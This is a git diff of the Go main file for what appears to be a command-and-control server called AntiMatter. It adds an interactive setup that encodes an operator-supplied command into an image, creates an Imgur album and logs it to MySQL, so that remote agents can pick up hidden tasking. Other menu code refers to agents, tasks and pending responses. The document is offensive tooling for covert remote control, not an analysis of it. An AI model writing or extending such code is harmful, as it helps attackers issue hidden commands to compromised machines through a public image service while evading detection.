@@ -1,6 +1,7 @@
 // TODO:
 // Error handling []
 // Display walkthroughs for each module [√]
+// Fix the tasking module since I commented out the upload function
 // Set up mysql and configure it for multiple agent handlings []
 // Error handling for existing tables and what not [√]
 // Set up tasking module / Database []
@@ -40,6 +41,7 @@ import (
 	"os"
 	"sort"
 	"strings"
+	"time"
 
 	// Internal libs
 	"github.com/AntiMatter/cmd"
@@ -137,10 +139,12 @@ func main() {
 			fmt.Println(" List		List images, albums, agents, and tasks")
 			fmt.Println(" Response	Search for any pending responses within an album")
 			fmt.Println(" Options	List out different options/modules you can choose from")
-			//	fmt.Println(" Init		Have the server walk you through filling in the options you need")
+			fmt.Println(" Init		Have the server walk you through filling in the options you need")
 			fmt.Println(" Exit		Exit program")
 			fmt.Println(" ")
 			fmt.Println(color.YellowString("[ The order these should be run in ] "))
+			fmt.Println("------------------------------------") // Literally just aethetic
+
 			fmt.Println(" ")
 			fmt.Println("1. Image\n2. Album\n3. Task\n4. Response")
 			fmt.Println(" ")
@@ -375,13 +379,13 @@ func main() {
 					imgurItems.Put("ImageID", imageID)
 					imgurItems.Put("ImageDeleteHash", deletehash)
 
-					// Here ask the user if they want to upload the previously created image to this new album
+					// This is to ask to add to recently created album, I don't think this is a good idea, but I'll leave just in case
 
 					//confirmAdd := yesNo()
 					//if confirmAdd {
-					cmd.AddImage(albumOptions["Album Delete-Hash"], imageOptions["ClientID"], deletehash.(string))
-					fmt.Println(color.GreenString("[+]"), "Successfully upload image to Album:", albumOptions["Title"])
-					internal.InsertTask(taskOptions["TaskingImageRaw"], taskOptions["Title"], taskOptions["Description"], imageID.(string), deletehash.(string))
+					//cmd.AddImage(albumOptions["Album Delete-Hash"], imageOptions["ClientID"], deletehash.(string))
+					//fmt.Println(color.GreenString("[+]"), "Successfully upload image to Album:", albumOptions["Title"])
+					//internal.InsertTask(taskOptions["TaskingImageRaw"], taskOptions["Title"], taskOptions["Description"], imageID.(string), deletehash.(string))
 					//}
 					//fmt.Println(success, "|", status)
 
@@ -449,7 +453,7 @@ func main() {
 						}
 
 					}
-					fmt.Println("\n")
+					fmt.Println(" ")
 
 				} else if strings.Contains(text, "check") {
 					albumID := responseOptions["AlbumID"]
@@ -495,7 +499,98 @@ func main() {
 		if strings.EqualFold(result, "Init") {
 			fmt.Println("Starting the simulation for you...")
 			fmt.Println("This will walk you through the options that you need to get this started")
+			fmt.Println(" ")
 
+			scanner := bufio.NewScanner(os.Stdin)
+
+			// Create encoded iamge
+			// **********************************************************************************************************
+
+			// Get client-id from user
+			fmt.Print("[~] Provide your client-id >> ")
+			scanner.Scan()
+			clientID := scanner.Text()
+			imageOptions["ClientID"] = clientID
+
+			// Ask for an image from the user
+			fmt.Print("[~] Provide a local image to encode >> ")
+			scanner.Scan()
+			localImage := scanner.Text()
+			imageOptions["BaseImage"] = localImage
+
+			// Ask for the new filename
+			fmt.Print("[~] Provide a new filename for the picture to upload (provide extension) >> ")
+			scanner.Scan()
+			newFileName := scanner.Text()
+			imageOptions["NewFilename"] = newFileName
+
+			// Ask for a command to encode in new image
+			fmt.Print("[~] Provide a command to encode into the new image >> ")
+			scanner.Scan()
+			command := scanner.Text()
+			imageOptions["Command"] = command
+
+			// Encode new image
+			fmt.Println("[+] Creating encoded image...")
+			time.Sleep(1 * time.Second)
+			cmd.CreateImage(imageOptions["Command"], imageOptions["BaseImage"], imageOptions["NewFilename"])
+
+			fmt.Println("Adding data to the SQL instance...")
+			// Utilizes the mysql stuff, currently have it set up on a Docker test server
+			internal.InsertImages(imageOptions["Command"], imageOptions["BaseImage"], imageOptions["NewFilename"])
+			fmt.Println("[+] All done! Moving on...")
+			time.Sleep(1 * time.Second)
+
+			// **********************************************************************************************************
+
+			// Create Album
+			// **********************************************************************************************************
+
+			// Get client-id from user
+			fmt.Print("[~] Provide your album title >> ")
+			scanner.Scan()
+			albumTitle := scanner.Text()
+			albumOptions["Title"] = albumTitle
+
+			// Encode new image
+			fmt.Println("[+] Creating album...")
+			time.Sleep(1 * time.Second)
+			albumID, deletehash := cmd.CreateAlbum(albumOptions["Title"], imageOptions["ClientID"])
+			albumOptions["AlbumID"] = albumID.(string)
+			albumOptions["Album Delete-Hash"] = deletehash.(string)
+
+			fmt.Println("Adding data to the SQL instance...")
+			// Utilizes the mysql stuff, currently have it set up on a Docker test server
+			internal.InsertAlbum(albumOptions["Title"], albumOptions["AlbumID"], albumOptions["Album Delete-Hash"])
+			fmt.Println("[+] All done! Moving on...")
+			time.Sleep(1 * time.Second)
+
+			// **********************************************************************************************************
+			/*
+				// Create Tasking
+				// **********************************************************************************************************
+
+				// Get client-id from user
+				fmt.Print("[~] Provide your Tasking title >> ")
+				scanner.Scan()
+				albumTitle := scanner.Text()
+				albumOptions["Title"] = albumTitle
+
+				// Encode new image
+				fmt.Println("[+] Creating album...")
+				time.Sleep(1 * time.Second)
+				albumID, deletehash := cmd.CreateAlbum(albumOptions["Title"], imageOptions["ClientID"])
+				albumOptions["AlbumID"] = albumID.(string)
+				albumOptions["Album Delete-Hash"] = deletehash.(string)
+
+				fmt.Println("Adding data to the SQL instance...")
+				// Utilizes the mysql stuff, currently have it set up on a Docker test server
+				internal.InsertAlbum(albumOptions["Title"], albumOptions["AlbumID"], albumOptions["Album Delete-Hash"])
+				fmt.Println("[+] All done! Moving on...")
+				time.Sleep(1 * time.Second)
+
+				// **********************************************************************************************************
+			*/
 		}
 
 		if strings.EqualFold(result, "List") {
